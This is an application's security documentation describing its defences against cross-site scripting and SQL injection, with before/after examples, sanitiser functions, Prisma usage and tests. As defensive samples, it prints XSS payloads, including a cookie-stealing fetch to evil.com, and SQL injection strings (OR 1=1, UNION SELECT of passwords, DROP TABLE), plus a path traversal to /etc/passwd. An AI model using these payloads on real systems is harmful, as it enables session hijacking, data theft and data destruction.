# 🛡️ Security Implementation Documentation

## Overview

This document provides comprehensive details about the OWASP security measures implemented in FoodONtracks to prevent **Cross-Site Scripting (XSS)** and **SQL Injection** attacks.

---

## Table of Contents

1. [Security Threats](#security-threats)
2. [Defense Strategy](#defense-strategy)
3. [Implementation Details](#implementation-details)
4. [Before/After Examples](#beforeafter-examples)
5. [Testing](#testing)
6. [Best Practices](#best-practices)
7. [Maintenance](#maintenance)

---

## Security Threats

### 1. Cross-Site Scripting (XSS)

**What is XSS?**
- Injection of malicious JavaScript code into web pages
- Attackers exploit input fields to inject scripts
- Scripts execute in victims' browsers with their permissions

**Attack Vectors**:
- Form inputs (comments, reviews, profiles)
- URL parameters
- Cookie values
- HTTP headers

**Potential Impact**:
- 🔓 Session hijacking (steal authentication tokens)
- 📧 Phishing attacks (redirect to fake login pages)
- 🦠 Malware distribution
- 🔍 Data theft (access sensitive information)
- 🎭 Defacement (change page appearance)

### 2. SQL Injection

**What is SQL Injection?**
- Manipulation of database queries through user input
- Attackers inject SQL commands to bypass security
- Direct access to database without authorization

**Attack Vectors**:
- Login forms (username/password fields)
- Search boxes
- URL parameters
- Cookie values

**Potential Impact**:
- 💾 Data theft (extract entire database)
- 🗑️ Data destruction (DROP TABLE commands)
- 🔓 Authentication bypass (OR 1=1 attacks)
- ⚙️ Privilege escalation (change user roles)
- 💣 Database server compromise

---

## Defense Strategy

### Defense in Depth Approach

We implement **multiple layers of security** to ensure that if one layer fails, others provide protection:

```
┌─────────────────────────────────────────┐
│  Layer 1: Input Validation              │ ← Reject obviously malicious input
├─────────────────────────────────────────┤
│  Layer 2: Input Sanitization            │ ← Clean/escape dangerous characters
├─────────────────────────────────────────┤
│  Layer 3: Parameterized Queries (ORM)   │ ← Prevent SQL injection
├─────────────────────────────────────────┤
│  Layer 4: Output Encoding                │ ← Escape output before rendering
├─────────────────────────────────────────┤
│  Layer 5: Content Security Policy       │ ← Browser-level protection
└─────────────────────────────────────────┘
```

---

## Implementation Details

### 1. Server-Side Input Sanitization

**File**: `src/utils/sanitize.ts`

#### Functions

##### `sanitizeStrictInput(input: string): string`
Removes ALL HTML tags - use for user-generated content.

```typescript
// Example: User comment
const comment = "<script>alert('hack')</script>Great food!";
const safe = sanitizeStrictInput(comment);
// Result: "Great food!"
```

##### `sanitizeHtmlInput(input: string): string`
Allows safe HTML tags (p, strong, em, etc.) - use for rich text.

```typescript
// Example: Restaurant description
const desc = "<p>Best <strong>pizza</strong> in town!</p><script>hack()</script>";
const safe = sanitizeHtmlInput(desc);
// Result: "<p>Best <strong>pizza</strong> in town!</p>"
```

##### `sanitizeEmail(email: string): string`
Validates and normalizes email addresses.

```typescript
// Example: User registration
const email = "User@Example.COM<script>alert(1)</script>";
const safe = sanitizeEmail(email);
// Result: "user@example.com"
```

##### `sanitizePhoneNumber(phone: string): string`
Extracts only valid digits and + sign.

```typescript
// Example: Contact form
const phone = "(123) 456-7890 <script>alert(1)</script>";
const safe = sanitizePhoneNumber(phone);
// Result: "123 456 7890"
```

##### `sanitizeUrl(url: string): string`
Blocks dangerous protocols (javascript:, data:, file:).

```typescript
// Example: User profile link
const url = "javascript:alert(document.cookie)";
const safe = sanitizeUrl(url);
// Result: "" (blocked)

const validUrl = "https://example.com";
const safe2 = sanitizeUrl(validUrl);
// Result: "https://example.com" (allowed)
```

##### `sanitizeSqlInput(input: string): string`
Removes SQL injection patterns (backup measure - ORM is primary defense).

```typescript
// Example: Search query
const search = "admin' OR '1'='1' --";
const safe = sanitizeSqlInput(search);
// Result: "admin OR 1=1 " (SQL syntax removed)
```

##### `sanitizeFilename(filename: string): string`
Prevents path traversal attacks.

```typescript
// Example: File upload
const filename = "../../../etc/passwd.txt";
const safe = sanitizeFilename(filename);
// Result: "etcpasswd.txt"
```

##### `sanitizeObject(obj: any): any`
Recursively sanitizes all string values in objects.

```typescript
// Example: Form submission
const formData = {
  name: "<script>alert(1)</script>John",
  email: "john@test.com",
  bio: "<iframe src='evil.com'></iframe>Nice guy"
};
const safe = sanitizeObject(formData);
// Result: { name: "John", email: "john@test.com", bio: "Nice guy" }
```

##### `isSuspiciousInput(input: string): boolean`
Detects potential attack patterns.

```typescript
// Example: Security monitoring
const input = "<script>alert(1)</script>";
const dangerous = isSuspiciousInput(input);
// Result: true

// Can trigger alerts, logging, or rate limiting
```

### 2. Client-Side Output Encoding

**File**: `src/utils/encode.tsx`

#### React Components

##### `<SafeHtml html={string} />`
Sanitizes HTML before rendering (uses DOMPurify).

```tsx
// Example: Display user review
const review = '<p>Great food!</p><script>alert(1)</script>';
<SafeHtml html={review} />
// Renders: <p>Great food!</p> (script removed)
```

##### `<SafeText text={string} />`
Strips ALL HTML tags and renders as plain text.

```tsx
// Example: Display username
const username = 'John<script>alert(1)</script>';
<SafeText text={username} />
// Renders: John (script removed)
```

#### Utility Functions

##### `htmlEncode(str: string): string`
Converts special characters to HTML entities.

```typescript
// Example: Display user input in attributes
const input = '"><script>alert(1)</script>';
const encoded = htmlEncode(input);
// Result: "&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;"
```

##### `urlEncode(str: string): string`
URL-encodes strings for safe use in URLs.

```typescript
// Example: Search query in URL
const query = 'pizza & pasta';
const encoded = urlEncode(query);
// Result: "pizza%20%26%20pasta"
```

##### `jsEscape(str: string): string`
Escapes strings for safe use in JavaScript.

```typescript
// Example: Pass data to inline script
const data = "'; alert(1); //";
const escaped = jsEscape(data);
// Result: "\\'; alert(1); \\/\\/"
```

### 3. SQL Injection Prevention (Prisma ORM)

**How Prisma Prevents SQL Injection**:

Prisma uses **parameterized queries** where user input is NEVER directly concatenated into SQL strings.

#### ✅ SAFE - Using Prisma

```typescript
// User input is treated as DATA, not CODE
const userEmail = "admin' OR '1'='1' --";

const user = await prisma.user.findFirst({
  where: {
    email: userEmail  // Prisma parameterizes this
  }
});

// Generated SQL (safe):
// SELECT * FROM users WHERE email = $1
// Parameters: ["admin' OR '1'='1' --"]
// Result: No users found (treated as literal string)
```

#### ❌ VULNERABLE - Raw SQL Concatenation

```typescript
// NEVER DO THIS!
const userEmail = "admin' OR '1'='1' --";

// Direct string concatenation
const query = `SELECT * FROM users WHERE email = '${userEmail}'`;
const user = await db.query(query);

// Generated SQL (vulnerable):
// SELECT * FROM users WHERE email = 'admin' OR '1'='1' --'
// Result: Returns ALL users (authentication bypassed!)
```

---

## Before/After Examples

### XSS Attack Examples

#### 1. Script Tag Injection

**Before (Vulnerable)**:
```html
<!-- Direct rendering without sanitization -->
<div>{userComment}</div>

<!-- User input: -->
<script>
  fetch('http://evil.com/steal?cookie=' + document.cookie);
</script>Nice restaurant!

<!-- Result: Script executes! Cookies stolen! -->
```

**After (Secure)**:
```tsx
// Using SafeText component
<SafeText text={userComment} />

// Output: "Nice restaurant!"
// Script completely removed
```

#### 2. Event Handler Injection

**Before (Vulnerable)**:
```html
<!-- Using dangerouslySetInnerHTML -->
<div dangerouslySetInnerHTML={{ __html: userBio }} />

<!-- User input: -->
<img src="x" onerror="alert(document.cookie)">

<!-- Result: Alert shows cookies when image fails to load -->
```

**After (Secure)**:
```tsx
// Using SafeHtml component
<SafeHtml html={userBio} />

// Output: <img src="x"> (onerror removed)
```

#### 3. JavaScript Protocol

**Before (Vulnerable)**:
```html
<!-- Direct URL rendering -->
<a href={userLink}>Click here</a>

<!-- User input: -->
javascript:alert(document.cookie)

<!-- Result: Clicking executes JavaScript -->
```

**After (Secure)**:
```typescript
// Using sanitizeUrl
const safeUrl = sanitizeUrl(userLink);
<a href={safeUrl || '#'}>Click here</a>

// safeUrl = "" (blocked)
// Link doesn't execute JavaScript
```

### SQL Injection Examples

#### 1. Login Bypass (OR 1=1)

**Before (Vulnerable)**:
```typescript
// Raw SQL query
const email = "admin@test.com' OR '1'='1' --";
const password = "anything";

const query = `
  SELECT * FROM users 
  WHERE email = '${email}' AND password = '${password}'
`;
// Query becomes: WHERE email = 'admin@test.com' OR '1'='1' --' AND password = '...'
// Result: Returns ALL users (authentication bypassed!)
```

**After (Secure)**:
```typescript
// Prisma parameterized query
const user = await prisma.user.findFirst({
  where: {
    email: email,  // Treated as literal string
    password: hashedPassword
  }
});
// Query: SELECT * FROM users WHERE email = $1 AND password = $2
// Parameters: ["admin@test.com' OR '1'='1' --", "hashedPassword"]
// Result: No user found (string doesn't match any email)
```

#### 2. Data Extraction (UNION SELECT)

**Before (Vulnerable)**:
```typescript
// Raw SQL query
const search = "pizza' UNION SELECT id, password, email FROM users --";

const query = `
  SELECT name, price FROM menu_items WHERE name LIKE '%${search}%'
`;
// Query becomes: 
// SELECT name, price FROM menu_items WHERE name LIKE '%pizza' 
// UNION SELECT id, password, email FROM users --%'
// Result: Returns user passwords along with menu items!
```

**After (Secure)**:
```typescript
// Prisma query
const items = await prisma.menuItem.findMany({
  where: {
    name: {
      contains: search  // Parameterized by Prisma
    }
  }
});
// Query: SELECT * FROM menu_items WHERE name LIKE $1
// Parameters: ["%pizza' UNION SELECT id, password, email FROM users --%"]
// Result: Searches for menu items with that exact string (no UNION executed)
```

#### 3. Data Destruction (DROP TABLE)

**Before (Vulnerable)**:
```typescript
// Raw SQL query with multiple statements
const comment = "Nice food'; DROP TABLE orders; --";

const query = `
  INSERT INTO reviews (comment) VALUES ('${comment}')
`;
// Query becomes:
// INSERT INTO reviews (comment) VALUES ('Nice food'); 
// DROP TABLE orders; --')
// Result: orders table DELETED!
```

**After (Secure)**:
```typescript
// Prisma create
await prisma.review.create({
  data: {
    comment: comment  // Parameterized by Prisma
  }
});
// Query: INSERT INTO reviews (comment) VALUES ($1)
// Parameters: ["Nice food'; DROP TABLE orders; --"]
// Result: Comment inserted as-is (no DROP executed)
```

---

## Testing

### Automated Tests

**File**: `scripts/test_security.ts`

Run the test suite:
```bash
npx tsx scripts/test_security.ts
```

**Test Coverage** (37 tests, 100% passing):
- ✅ XSS Prevention (7 tests)
- ✅ SQL Injection Detection (6 tests)
- ✅ Email Sanitization (4 tests)
- ✅ Phone Sanitization (3 tests)
- ✅ URL Sanitization (5 tests)
- ✅ Filename Sanitization (4 tests)
- ✅ Object Sanitization (3 tests)
- ✅ Suspicious Pattern Detection (5 tests)

### Interactive Demo

**URL**: `/security-demo`

Features:
- 🎯 Test 5 XSS attack patterns with live input
- 💉 Test 4 SQL injection patterns with live database queries
- 📊 See before/after comparison
- 🚨 Visual feedback for dangerous inputs
- 📋 Best practices checklist

### API Testing

#### XSS Testing Endpoint

```bash
# Test XSS sanitization
curl -X POST http://localhost:3000/api/security/test-xss \
  -H "Content-Type: application/json" \
  -d '{"input": "<script>alert(1)</script>Hello"}'

# Response:
{
  "original": "<script>alert(1)</script>Hello",
  "sanitized": "Hello",
  "suspicious": true,
  "detectedPatterns": ["Script tag injection"],
  "protection": {
    "method": "sanitize-html library",
    "action": "Removed all HTML tags and dangerous patterns",
    "safe": true
  }
}
```

#### SQL Testing Endpoint

```bash
# Test SQL injection protection
curl -X POST http://localhost:3000/api/security/test-sql \
  -H "Content-Type: application/json" \
  -d '{"input": "admin'\'' OR '\''1'\''='\''1'\'' --"}'

# Response:
{
  "original": "admin' OR '1'='1' --",
  "sanitized": "admin OR 11 ",
  "suspicious": true,
  "detectedPatterns": ["OR/AND 1=1 pattern", "SQL comment"],
  "protection": {
    "method": "Prisma ORM with parameterized queries",
    "safe": true,
    "explanation": "Malicious SQL patterns detected. Prisma parameterized queries prevent SQL injection..."
  }
}
```

---

## Best Practices

### Development Guidelines

1. **Never Trust User Input**
   - Always assume user input is malicious
   - Validate and sanitize ALL input sources
   - This includes: forms, URLs, cookies, headers

2. **Use Parameterized Queries**
   - Always use Prisma ORM for database access
   - Never concatenate user input into SQL strings
   - If raw SQL is absolutely necessary, use prepared statements

3. **Encode Output**
   - Sanitize data before rendering in UI
   - Use `<SafeHtml>` or `<SafeText>` components
   - Context matters: HTML, JS, URL each need different encoding

4. **Principle of Least Privilege**
   - Database users should have minimum required permissions
   - API endpoints should require authentication
   - Use RBAC to limit access to sensitive operations

5. **Defense in Depth**
   - Don't rely on a single security measure
   - Implement multiple layers of protection
   - If one layer fails, others provide backup

### Code Review Checklist

Before committing code, verify:

- [ ] All user inputs are sanitized
- [ ] Database queries use Prisma ORM (no raw SQL)
- [ ] Output rendering uses `SafeHtml` or `SafeText`
- [ ] URLs from users go through `sanitizeUrl()`
- [ ] File uploads go through `sanitizeFilename()`
- [ ] Form data is validated with Zod schemas
- [ ] Security tests pass (`npm run test:security`)
- [ ] No `dangerouslySetInnerHTML` without sanitization
- [ ] No `eval()` or `Function()` with user input

---

## Maintenance

### Regular Tasks

#### Weekly
- [ ] Update security dependencies (`npm audit fix`)
- [ ] Review security audit logs
- [ ] Check for new CVEs in dependencies

#### Monthly
- [ ] Review and update sanitization patterns
- [ ] Analyze attack attempt patterns from logs
- [ ] Update security tests for new features

#### Quarterly
- [ ] Penetration testing
- [ ] Security code review
- [ ] Update security documentation

#### Annually
- [ ] Third-party security audit
- [ ] Review OWASP Top 10 updates
- [ ] Security training for team

### Monitoring

Set up alerts for:
- 🚨 Suspicious input patterns detected
- 🚨 High rate of sanitization triggers
- 🚨 Repeated authentication failures
- 🚨 Unusual database query patterns

### Dependency Security

```bash
# Check for vulnerabilities
npm audit

# Fix automatically
npm audit fix

# Review specific packages
npm audit fix --package-lock-only
```

### Future Enhancements

1. **Rate Limiting**
   - Implement per-IP request limits
   - Use Redis for distributed rate limiting
   - Add CAPTCHA for sensitive operations

2. **Content Security Policy**
   - Set CSP headers to restrict script sources
   - Disallow inline scripts and styles
   - Report CSP violations

3. **Web Application Firewall**
   - Deploy WAF (e.g., Cloudflare, AWS WAF)
   - Block common attack patterns at edge
   - Reduce load on application servers

4. **Security Headers**
   - X-Frame-Options (prevent clickjacking)
   - X-Content-Type-Options (prevent MIME sniffing)
   - Strict-Transport-Security (enforce HTTPS)
   - Referrer-Policy (limit referrer information)

5. **Automated Security Scanning**
   - Integrate OWASP ZAP in CI/CD
   - Run security tests on every deployment
   - Block deployments with critical vulnerabilities

---

## Resources

### Documentation
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [Prisma Security Documentation](https://www.prisma.io/docs/concepts/components/prisma-client/raw-database-access#raw-queries)
- [DOMPurify Documentation](https://github.com/cure53/DOMPurify)

### Tools
- [OWASP ZAP](https://www.zaproxy.org/) - Security scanner
- [Burp Suite](https://portswigger.net/burp) - Penetration testing
- [npm audit](https://docs.npmjs.com/cli/v8/commands/npm-audit) - Dependency scanning
- [Snyk](https://snyk.io/) - Vulnerability scanning

### Training
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [HackerOne 101](https://www.hackerone.com/hackers/hacker101)

---

**Last Updated**: December 2024  
**Maintained By**: FoodONtracks Development Team  
**Security Contact**: security@foodontracks.com
